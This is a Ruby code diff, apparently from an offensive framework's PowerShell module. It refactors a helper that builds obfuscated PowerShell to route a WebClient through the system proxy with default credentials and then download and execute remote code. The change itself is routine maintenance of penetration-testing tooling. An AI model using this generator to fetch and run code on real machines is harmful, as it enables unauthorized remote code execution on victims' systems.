@@ -172,6 +172,19 @@ module Powershell
       %Q^[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;^
     end
 
+    # Use the default system web proxy and credentials
+    #
+    # @return [String] Powershell code to use the default system web proxy and credentials
+    def self.proxy_aware
+      var = Rex::Text.rand_text_alpha(1)
+      cmd = "$#{var}=new-object net.webclient;"
+      cmd << "if([System.Net.WebProxy]::GetDefaultProxy().address -ne $null){"
+      cmd << "$#{var}.proxy=[Net.WebRequest]::GetSystemWebProxy();"
+      cmd << "$#{var}.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;"
+      cmd << "};"
+      cmd
+    end
+
     #
     # Use the default system web proxy and credentials to download a URL
     # as a string and execute the contents as PowerShell
@@ -181,14 +194,7 @@ module Powershell
     #
     # @return [String] PowerShell code to download a URL
     def self.proxy_aware_download_and_exec_string(urls, iex = true)
-      var = Rex::Text.rand_text_alpha(1)
-      cmd = "$#{var}=new-object net.webclient;"
-      cmd << "if([System.Net.WebProxy]::GetDefaultProxy().address -ne $null){"
-      cmd << "$#{var}.proxy=[Net.WebRequest]::GetSystemWebProxy();"
-      cmd << "$#{var}.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;"
-      cmd << "};"
-      cmd << download_and_exec_string(urls, iex)
-      cmd
+      "#{self.proxy_aware}#{download_and_exec_string(urls, iex)}"
     end
 
     def self.uglify_ps(script)
